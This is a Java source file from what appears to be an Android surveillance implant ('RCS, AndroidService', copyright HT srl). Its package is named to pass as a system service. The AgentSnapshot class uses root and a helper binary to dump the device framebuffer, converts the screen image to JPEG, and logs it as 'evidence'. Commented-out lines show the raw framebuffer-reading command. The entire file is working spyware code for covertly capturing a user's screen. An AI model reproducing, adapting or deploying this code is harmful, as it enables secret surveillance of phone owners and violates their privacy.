/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SnapshotAgent.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.IntBuffer;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.util.Log;
import android.view.Display;
import android.view.View;
import android.view.WindowManager;

import com.android.service.LogR;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.evidence.EvidenceType;
import com.android.service.file.AutoFile;
import com.android.service.util.DataBuffer;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

/**
 * The Class SnapshotAgent.
 */
public class AgentSnapshot extends AgentBase {

	private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 70;
	private static final int LOG_SNAPSHOT_VERSION = 2009031201;
	private static final int MIN_TIMER = 1 * 1000;
	private static final long SNAPSHOT_DELAY = 1000;

	private static final String TAG = "AgentSnapshot";

	/** The Constant CAPTURE_FULLSCREEN. */
	final private static int CAPTURE_FULLSCREEN = 0;

	/** The Constant CAPTURE_FOREGROUND. */
	final private static int CAPTURE_FOREGROUND = 1;

	/** The delay. */
	private int delay;

	/** The type. */
	private int type;

	/**
	 * Instantiates a new snapshot agent.
	 */
	public AgentSnapshot() {
		if (Cfg.DEBUG)
			Log.d("QZ", TAG + " SnapshotAgent constructor");
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(AgentConf conf) {
		byte[] confParameters = conf.getParams();
		myConf = Utils.bufferToByteBuffer(confParameters,
				ByteOrder.LITTLE_ENDIAN);

		this.delay = myConf.getInt();
		this.type = myConf.getInt();

		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#begin()
	 */
	@Override
	public void begin() {
		setDelay(this.delay);
		setPeriod(this.delay);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public void go() {
		// final LogR log = new LogR(EvidenceType.SNAPSHOT, LogR.LOG_PRI_STD);

		switch (type) {
		case CAPTURE_FULLSCREEN:

			if (Cfg.DEBUG)
				Log.d("QZ", TAG + " Snapshot Agent: logging full screen");
			break;

		case CAPTURE_FOREGROUND:
			if (Cfg.DEBUG)
				Log.d("QZ", TAG + " Snapshot Agent: logging foreground window");
			break;

		default:
			if (Cfg.DEBUG)
				Log.d("QZ", TAG + " Snapshot Agent: wrong capture parameter");
			break;
		}

		try{
			
			
			
		if (Status.self().haveRoot()) {
			Display display = ((WindowManager) Status.getAppContext()
					.getSystemService(Context.WINDOW_SERVICE))
					.getDefaultDisplay();
			int width = display.getWidth();
			int height = display.getHeight();
			
			if(Cfg.DEBUG) Log.d("QZ", TAG + " (go): w="+width+" h="+height);
			
			byte[] raw = getRawBitmap();
			if (raw != null) {
				Bitmap bitmap = Bitmap.createBitmap(width,
						height, Bitmap.Config.ARGB_8888);

				IntBuffer buffer  = raw2IntBuffer(raw);
				//bitmap.copyPixelsFromBuffer(buffer);
				bitmap.setPixels(buffer.array(), 0, width, 0, 0, width, height);
				byte[] jpeg = toJpeg(bitmap);

				new LogR(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
			}
		}
		}catch(Exception ex){
			if(Cfg.DEBUG){
				Log.d("QZ", TAG + " (go) Error: " + ex);
				ex.printStackTrace();
			}
		}

		// log.close();
	}

	private IntBuffer raw2IntBuffer(byte[] raw) {
		DataBuffer databuffer= new DataBuffer(raw);
		return databuffer.asIntBuffer();
	}

	private byte[] getAdditionalData() {
		final String window = "Desktop";

		final int wlen = window.length() * 2;
		final int tlen = wlen + 24;
		final byte[] additionalData = new byte[tlen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen);

		databuffer.writeInt(LOG_SNAPSHOT_VERSION); // version
		databuffer.writeInt(0); // process name len
		databuffer.writeInt(wlen); // windows name len

		byte[] windowsName = new byte[wlen];
		windowsName = WChar.getBytes(window);
		databuffer.write(windowsName);

		return additionalData;
	}

	private byte[] toJpeg(Bitmap bitmap) {

		ByteArrayOutputStream os = new ByteArrayOutputStream();
		bitmap.compress(Bitmap.CompressFormat.JPEG,
				SNAPSHOT_DEFAULT_JPEG_QUALITY, os);

		byte[] array = os.toByteArray();
		return array;

	}

	private byte[] getRawBitmap() {
		// String
		// getrawpath="statuslog -c \"/system/bin/cat /dev/graphics/fb0\""
		File filesPath = Status.getAppContext().getFilesDir();
		String path = filesPath.getAbsolutePath();

		// String

		// String getrawpath = path +
		// "/statusdb -c \"/system/bin/cp /dev/graphics/fb0 "+path+"/frame0\"";
		String getrawpath = path + "/statusdb fb";
		try {
			Process localProcess = Runtime.getRuntime().exec(getrawpath);
			localProcess.waitFor();

			AutoFile file = new AutoFile(path, "frame");
			if (file.exists()) {
				return file.read();
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
	 */
	@Override
	public void end() {

	}
}
